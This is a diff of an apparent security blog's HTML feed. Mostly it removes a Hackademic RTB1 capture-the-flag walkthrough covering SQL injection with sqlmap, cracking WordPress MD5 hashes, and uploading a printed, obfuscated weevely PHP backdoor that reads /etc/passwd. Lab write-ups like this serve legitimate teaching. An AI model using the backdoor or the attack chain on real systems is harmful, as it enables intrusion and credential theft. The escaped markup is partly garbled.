-</span><span class='line'><span class="go">[email &lt;a href=&quot;&amp;#109;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#98;&amp;#x6c;&amp;#97;&amp;#64;&amp;#98;&amp;#x6c;&amp;#x61;&amp;#x62;&amp;#108;&amp;#x61;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#x6d;&quot;&gt;&amp;#x62;&amp;#x6c;&amp;#97;&amp;#x40;&amp;#x62;&amp;#108;&amp;#97;&amp;#98;&amp;#108;&amp;#x61;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;&lt;/a&gt;]&lt;/p&gt;</span>
+</span><span class='line'><span class="go">[email &lt;a href=&quot;&amp;#109;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#111;&amp;#58;&amp;#98;&amp;#108;&amp;#x61;&amp;#64;&amp;#98;&amp;#108;&amp;#97;&amp;#98;&amp;#x6c;&amp;#x61;&amp;#x2e;&amp;#x63;&amp;#x6f;&amp;#x6d;&quot;&gt;&amp;#98;&amp;#x6c;&amp;#x61;&amp;#x40;&amp;#98;&amp;#x6c;&amp;#97;&amp;#x62;&amp;#108;&amp;#97;&amp;#x2e;&amp;#99;&amp;#x6f;&amp;#109;&lt;/a&gt;]&lt;/p&gt;</span>
 </span><span class='line'>
 </span><span class='line'><span class="go">&lt;p&gt;sh-4.2$ ./flag09 /tmp/09 testing</span>
 </span><span class='line'><span class="go">bla AT blabla dot com</span>
@@ -2806,7 +3891,7 @@ any here.</p>
 </span><span class='line'><span class="k">var</span> <span class="nv">$offset_user</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
 </span><span class='line'><span class="o">/&lt;</span><span class="nx">em</span><span class="o">&gt;</span> <span class="nx">Mail</span> <span class="nx">Settings</span> <span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;/</span>
 </span><span class='line'><span class="k">var</span> <span class="nv">$mailer</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nb">mail</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
-</span><span class='line'><span class="k">var</span> <span class="nv">$mailfrom</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;&amp;#x6d;&amp;#x61;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#58;&amp;#x61;&amp;#100;&amp;#x6d;&amp;#105;&amp;#110;&amp;#64;&amp;#104;&amp;#x61;&amp;#99;&amp;#107;&amp;#97;&amp;#x64;&amp;#101;&amp;#x6d;&amp;#x69;&amp;#114;&amp;#x74;&amp;#x62;&amp;#50;&amp;#x2e;&amp;#x63;&amp;#111;&amp;#x6d;&quot;</span><span class="o">&gt;&amp;</span><span class="c1">#97;&amp;#x64;&amp;#109;&amp;#x69;&amp;#x6e;&amp;#64;&amp;#104;&amp;#x61;&amp;#x63;&amp;#107;&amp;#97;&amp;#100;&amp;#101;&amp;#109;&amp;#105;&amp;#x72;&amp;#116;&amp;#98;&amp;#50;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;&lt;/a&gt;&amp;rsquo;;</span>
+</span><span class='line'><span class="k">var</span> <span class="nv">$mailfrom</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;&amp;#109;&amp;#97;&amp;#105;&amp;#x6c;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#97;&amp;#x64;&amp;#x6d;&amp;#x69;&amp;#110;&amp;#64;&amp;#104;&amp;#x61;&amp;#x63;&amp;#x6b;&amp;#x61;&amp;#x64;&amp;#101;&amp;#x6d;&amp;#x69;&amp;#114;&amp;#x74;&amp;#98;&amp;#50;&amp;#x2e;&amp;#99;&amp;#111;&amp;#109;&quot;</span><span class="o">&gt;&amp;</span><span class="c1">#97;&amp;#100;&amp;#109;&amp;#105;&amp;#x6e;&amp;#x40;&amp;#x68;&amp;#97;&amp;#x63;&amp;#107;&amp;#x61;&amp;#100;&amp;#101;&amp;#109;&amp;#105;&amp;#x72;&amp;#x74;&amp;#98;&amp;#50;&amp;#46;&amp;#99;&amp;#x6f;&amp;#x6d;&lt;/a&gt;&amp;rsquo;;</span>
 </span><span class='line'><span class="k">var</span> <span class="nv">$fromname</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">Hackademic</span><span class="o">.</span><span class="nx">RTB2</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
 </span><span class='line'><span class="k">var</span> <span class="nv">$sendmail</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">sbin</span><span class="o">/</span><span class="nx">sendmail</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
 </span><span class='line'><span class="k">var</span> <span class="nv">$smtpauth</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="mi">0</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;;</span>
@@ -3207,575 +4292,6 @@ from output above, there is port-knocking mechanism using sequences 7000,8000,90
 <p>So the SQLi test is validated using string compare operator and it&rsquo;s quite
 non-realistic (and unfair) to have two statements with the different case, that
 was the reason why we didn&rsquo;t found out this firstly.</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Hackademic: RTB1]]></title>
-    <link href="http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1/"/>
-    <updated>2015-05-29T14:32:12+02:00</updated>
-    <id>http://73696e65.github.io/blog/2015/05/29/hackademic-rtb1</id>
-    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/hackademic-rtb1,17/">Hackademic: RTB1</a></p>
-
-<p>We gained the IP address 192.168.80.146 for our testing target.</p>
-
-<p>Nmap output:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nmap 192.168.80.146 -sV -p-&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Starting Nmap 6.47 ( &lt;a href="http://nmap.org">http://nmap.org&lt;/a> ) at 2015-04-28 17:14 CEST
-</span><span class='line'>Nmap scan report for 192.168.80.146
-</span><span class='line'>Host is up (0.00032s latency).
-</span><span class='line'>Not shown: 65533 filtered ports
-</span><span class='line'>PORT   STATE  SERVICE VERSION
-</span><span class='line'>22/tcp closed ssh
-</span><span class='line'>80/tcp open   http    Apache httpd 2.2.15 ((Fedora))
-</span><span class='line'>MAC Address: 00:0C:29:01:8A:4D (VMware)&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>Service detection performed. Please report any incorrect results at &lt;a href="http://nmap.org/submit/">http://nmap.org/submit/&lt;/a> .
-</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 153.05 seconds</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Nikto output:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-<span class='line-number'>38</span>
-<span class='line-number'>39</span>
-<span class='line-number'>40</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# nikto -h 192.168.80.146&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;h2>- Nikto v2.1.6&lt;/h2>
-</span><span class='line'>
-</span><span class='line'>&lt;ul>
-</span><span class='line'>&lt;li>Target IP:          192.168.80.146&lt;/li>
-</span><span class='line'>&lt;li>Target Hostname:    192.168.80.146&lt;/li>
-</span><span class='line'>&lt;li>Target Port:        80
-</span><span class='line'>
-</span><span class='line'>&lt;ul>
-</span><span class='line'>&lt;li>Start Time:         2015-04-28 17:18:04 (GMT2)&lt;/li>
-</span><span class='line'>&lt;/ul>
-</span><span class='line'>&lt;/li>
-</span><span class='line'>&lt;/ul>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>&lt;hr />
-</span><span class='line'>
-</span><span class='line'>&lt;ul>
-</span><span class='line'>&lt;li>Server: Apache/2.2.15 (Fedora)&lt;/li>
-</span><span class='line'>&lt;li>Server leaks inodes via ETags, header found with file /, inode: 12748, size: 1475, mtime: Sun Jan  9 18:22:11 2011&lt;/li>
-</span><span class='line'>&lt;li>The anti-clickjacking X-Frame-Options header is not present.&lt;/li>
-</span><span class='line'>&lt;li>Apache/2.2.15 appears to be outdated (current is at least Apache/2.4.7). Apache 2.0.65 (final release) and 2.2.26 are also current.&lt;/li>
-</span><span class='line'>&lt;li>Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE&lt;/li>
-</span><span class='line'>&lt;li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST&lt;/li>
-</span><span class='line'>&lt;li>OSVDB-3268: /icons/: Directory indexing found.&lt;/li>
-</span><span class='line'>&lt;li>OSVDB-3233: /icons/README: Apache default file found.&lt;/li>
-</span><span class='line'>&lt;li>7354 requests: 0 error(s) and 7 item(s) reported on remote host
-</span><span class='line'>
-</span><span class='line'>&lt;ul>
-</span><span class='line'>&lt;li>End Time:           2015-04-28 17:18:15 (GMT2) (11 seconds)&lt;/li>
-</span><span class='line'>&lt;/ul>
-</span><span class='line'>&lt;/li>
-</span><span class='line'>&lt;/ul>
-</span><span class='line'>
-</span><span class='line'>
-</span><span class='line'>&lt;hr />
-</span><span class='line'>
-</span><span class='line'>&lt;ul>
-</span><span class='line'>&lt;li>1 host(s) tested</span></code></pre></td></tr></table></div></figure></li>
-</ul>
-
-
-<p>There was SQL injection on the web page, vulnerable wordpress instance:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1&lt;/a>'
-</span><span class='line'>SELECT * FROM wp_categories WHERE cat_ID = 1\\&lsquo; LIMIT 1</span></code></pre></td></tr></table></div></figure></p>
-
-<p>This will take longer and it&rsquo;s not necessery to dump everything:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~# sqlmap -u &ldquo;&lt;a href="http://192.168.80.146/Hackademic_RTB1/?cat=1">http://192.168.80.146/Hackademic_RTB1/?cat=1&lt;/a>&rdquo; &ndash;dump-all</span></code></pre></td></tr></table></div></figure></p>
-
-<p>Some of the output:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&ndash;current-user:
-</span><span class='line'>current user:    &lsquo;root@localhost&rsquo;
-</span><span class='line'>&ndash;current-db:
-</span><span class='line'>current database:    &lsquo;wordpress&rsquo;
-</span><span class='line'>&ndash;privileges:
-</span><span class='line'>[&lt;em>] &lsquo;root&rsquo;@&lsquo;localhost&rsquo; (administrator) [27]:
-</span><span class='line'>    privilege: ALTER
-</span><span class='line'>    privilege: ALTER ROUTINE
-</span><span class='line'>    privilege: CREATE
-</span><span class='line'>    privilege: CREATE ROUTINE
-</span><span class='line'>    privilege: CREATE TEMPORARY TABLES
-</span><span class='line'>    privilege: CREATE USER
-</span><span class='line'>    privilege: CREATE VIEW
-</span><span class='line'>    privilege: DELETE
-</span><span class='line'>    privilege: DROP
-</span><span class='line'>    privilege: EVENT
-</span><span class='line'>    privilege: EXECUTE
-</span><span class='line'>    privilege: FILE
-</span><span class='line'>    privilege: INDEX
-</span><span class='line'>    privilege: INSERT
-</span><span class='line'>    privilege: LOCK TABLES
-</span><span class='line'>    privilege: PROCESS
-</span><span class='line'>    privilege: REFERENCES
-</span><span class='line'>    privilege: RELOAD
-</span><span class='line'>    privilege: REPLICATION CLIENT
-</span><span class='line'>    privilege: REPLICATION SLAVE
-</span><span class='line'>    privilege: SELECT
-</span><span class='line'>    privilege: SHOW DATABASES
-</span><span class='line'>    privilege: SHOW VIEW
-</span><span class='line'>    privilege: SHUTDOWN
-</span><span class='line'>    privilege: SUPER
-</span><span class='line'>    privilege: TRIGGER
-</span><span class='line'>    privilege: UPDATE
-</span><span class='line'>&ndash;passwords:
-</span><span class='line'>database management system users password hashes:
-</span><span class='line'>[&lt;/em>] root [1]:
-</span><span class='line'>    password hash: 2eaec110380126d7</span></code></pre></td></tr></table></div></figure></p>
-
-<p>The wordpress could be scanned using wpscan too:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# wpscan &lt;a href="http://192.168.80.146/Hackademic_RTB1">http://192.168.80.146/Hackademic_RTB1&lt;/a></span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# cat wp_users.csv
-</span><span class='line'>ID,user_idmode,user_ip,user_icq,user_msn,user_yim,user_url,user_aim,user_pass,user_login,user_level,user_email,user_status,user_domain,user_browser,user_nicename,user_nickname,user_lastname,user_firstname,user_registered,user_description,user_activation_key
-</span><span class='line'>1,login,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,21232f297a57a5a743894a0e4a801fc3,NickJames,1,NickJames@hacked.com,0,&lt;blank>,&lt;blank>,nickjames,NickJames,James,Nick,2010-10-25 20:40:23,&lt;blank>,&lt;blank>
-</span><span class='line'>2,login,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,b986448f0bb9e5e124ca91d3d650f52c,JohnSmith,0,JohnSmith@hacked,0,&lt;blank>,&lt;blank>,johnsmith,JohnSmith,Smith,John,2010-10-25 21:25:22,&lt;blank>,&lt;blank>
-</span><span class='line'>3,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,7cbb3252ba6b7e9c422fac5334d22054,GeorgeMiller,10,GeorgeMiller@hacked.com,0,&lt;blank>,&lt;blank>,georgemiller,GeorgeMiller,Miller,George,2011-01-07 03:08:51,&lt;blank>,&lt;blank>
-</span><span class='line'>4,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,a6e514f9486b83cb53d8d932f9a04292,TonyBlack,0,TonyBlack@hacked.com,0,&lt;blank>,&lt;blank>,tonyblack,TonyBlack,Black,Tony,2011-01-07 03:09:55,&lt;blank>,&lt;blank>
-</span><span class='line'>5,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,8601f6e1028a8e8a966f6c33fcd9aec4,JasonKonnors,0,JasonKonnors@hacked.com,0,&lt;blank>,&lt;blank>,jasonkonnors,JasonKonnors,Konnors,Jason,2011-01-07 03:10:36,&lt;blank>,&lt;blank>
-</span><span class='line'>6,nickname,&lt;blank>,0,&lt;blank>,&lt;blank>,&lt;a href="http://,">http://,&lt;/a>&lt;blank>,50484c19f1afdaf3841a0d821ed393d2,MaxBucky,0,MaxBucky@hacked.com,0,&lt;blank>,&lt;blank>,maxbucky,MaxBucky,Bucky,Max,2011-01-07 03:11:18,&lt;blank>,&lt;blank></span></code></pre></td></tr></table></div></figure></p>
-
-<p>&ldquo;GeorgeMiller:q1w2e3&rdquo; has the highest privileges (user_level 10).</p>
-
-<p>We crack the hashes:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# egrep &ldquo;^[0-9]+&rdquo; wp_users.csv| awk -F, &lsquo;{print $10 &ldquo;:&rdquo;  $9}&rsquo;  > /tmp/wp_users.john
-</span><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# john /tmp/wp_users.john &ndash;format=raw-md5
-</span><span class='line'>Loaded 6 password hashes with no different salts (Raw MD5 [128/128 SSE2 intrinsics 12x])
-</span><span class='line'>NickJames:admin
-</span><span class='line'>JohnSmith:PUPPIES
-</span><span class='line'>GeorgeMiller:q1w2e3
-</span><span class='line'>TonyBlack:napoleon
-</span><span class='line'>JasonKonnors:maxwell
-</span><span class='line'>MaxBucky:kernel
-</span><span class='line'>guesses: 6  time: 0:00:00:01 DONE (Tue Apr 28 18:16:40 2015)  c/s: 7580K  trying: kernel - kernit
-</span><span class='line'>Use the &ldquo;&ndash;show&rdquo; option to display all of the cracked passwords reliably</span></code></pre></td></tr></table></div></figure></p>
-
-<p>We log in using GeorgeMiller&rsquo;s account and under &ldquo;Manage -> Files&rdquo; we upload the generated weevely shell:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely generate 1234
-</span><span class='line'><span class="o">[</span>generate.php<span class="o">]</span> Backdoor file <span class="p">&amp;</span>lsquo<span class="p">;</span>weevely.php<span class="p">&amp;</span>rsquo<span class="p">;</span> created with password <span class="p">&amp;</span>lsquo<span class="p">;</span>1234<span class="p">&amp;</span>rsquo<span class="p">;</span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">root</span><span class="o">@</span><span class="nx">kali32</span><span class="o">:~/.</span><span class="nx">sqlmap</span><span class="o">/</span><span class="nx">output</span><span class="o">/</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">80.146</span><span class="o">/</span><span class="nx">dump</span><span class="o">/</span><span class="nx">wordpress</span><span class="c1"># cat weevely.php</span>
-</span><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
-</span><span class='line'><span class="nv">$duiq</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">sc</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">scssctscrsc_scrsceplscasccsce</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="nv">$lucw</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">MoJGEpPjMpeyRrPSczNCcwoh7ZWNobyAnPwohCcuJGsuJz4nO2V2YWwoYmFzZTY0X2RlwohY29wohkZShwoh</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
-</span><span class='line'><span class="nv">$udtq</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">JGM9J2NvdwohWwoh50JzskYwohT0kX0NPT0tJRTtpZihyZXNlwohdCgkYSwohkwoh9wohPScxMicwohgJwohiYgJG</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
-</span><span class='line'><span class="nv">$foif</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">IGpvaW4oYXJywohYXlfc2xpY2UoJGwohEsJGMoJGwohEpLTMpwohKSkpKTtlY2hvICc8LycuwohJGsuJz4nwohO30</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
-</span><span class='line'><span class="nv">$kvzf</span><span class="o">=&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">wcmwohVnX3JlcGxhY2UwohoYXJwohyYwohXkoJy9bXlx3PVxzXSwoh8nLCcvXHMwohvJyksIGFycmF5wohKCcnLCcrJykwohs</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
-</span><span class='line'><span class="nv">$tkjs</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">v</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">bvavsve6v4v_vdvevcvovdve</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="nv">$nqkm</span> <span class="o">=</span> <span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">d</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">dcdrdedatded_fudncdtdidodn</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span>
-</span><span class='line'><span class="nv">$itsd</span> <span class="o">=</span> <span class="nv">$nqkm</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;,</span> <span class="nv">$tkjs</span><span class="p">(</span><span class="nv">$duiq</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">woh</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;,</span> <span class="nv">$udtq</span><span class="o">.</span><span class="nv">$lucw</span><span class="o">.</span><span class="nv">$kvzf</span><span class="o">.</span><span class="nv">$foif</span><span class="p">)));</span> <span class="nv">$itsd</span><span class="p">();</span>
-</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
-</span></code></pre></td></tr></table></div></figure></p>
-
-<p>We connect using weevely and found out the mysql root password:
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-<span class='line-number'>30</span>
-<span class='line-number'>31</span>
-<span class='line-number'>32</span>
-<span class='line-number'>33</span>
-<span class='line-number'>34</span>
-<span class='line-number'>35</span>
-<span class='line-number'>36</span>
-<span class='line-number'>37</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~/.sqlmap/output/192.168.80.146/dump/wordpress# weevely &lt;a href="http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php">http://192.168.80.146/Hackademic_RTB1/wp-content/plugins/hello.php&lt;/a> 1234&lt;/p>
-</span><span class='line'>
-</span><span class='line'>&lt;p>root:x:0:0:root:/root:/bin/bash
-</span><span class='line'>bin:x:1:1:bin:/bin:/sbin/nologin
-</span><span class='line'>daemon:x:2:2:daemon:/sbin:/sbin/nologin
-</span><span class='line'>adm:x:3:4:adm:/var/adm:/sbin/nologin
-</span><span class='line'>lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
-</span><span class='line'>sync:x:5:0:sync:/sbin:/bin/sync
-</span><span class='line'>shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
-</span><span class='line'>halt:x:7:0:halt:/sbin:/sbin/halt
-</span><span class='line'>mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
-</span><span class='line'>uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
-</span><span class='line'>operator:x:11:0:operator:/root:/sbin/nologin
-</span><span class='line'>games:x:12:100:games:/usr/games:/sbin/nologin
-</span><span class='line'>gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
-</span><span class='line'>&lt;a href="ftp:x:14:50:FTP">ftp:x:14:50:FTP&lt;/a> User:/var/&lt;a href="ftp:/sbin/nologin">ftp:/sbin/nologin&lt;/a>
-</span><span class='line'>nobody:x:99:99:Nobody:/:/sbin/nologin
-</span><span class='line'>vcsa:x:69:499:virtual console memory owner:/dev:/sbin/nologin
-</span><span class='line'>avahi-autoipd:x:499:498:avahi-autoipd:/var/lib/avahi-autoipd:/sbin/nologin
-</span><span class='line'>ntp:x:38:38::/etc/ntp:/sbin/nologin
-</span><span class='line'>dbus:x:81:81:System message bus:/:/sbin/nologin
-</span><span class='line'>rtkit:x:498:494:RealtimeKit:/proc:/sbin/nologin
-</span><span class='line'>nscd:x:28:493:NSCD Daemon:/:/sbin/nologin
-</span><span class='line'>tcpdump:x:72:72::/:/sbin/nologin
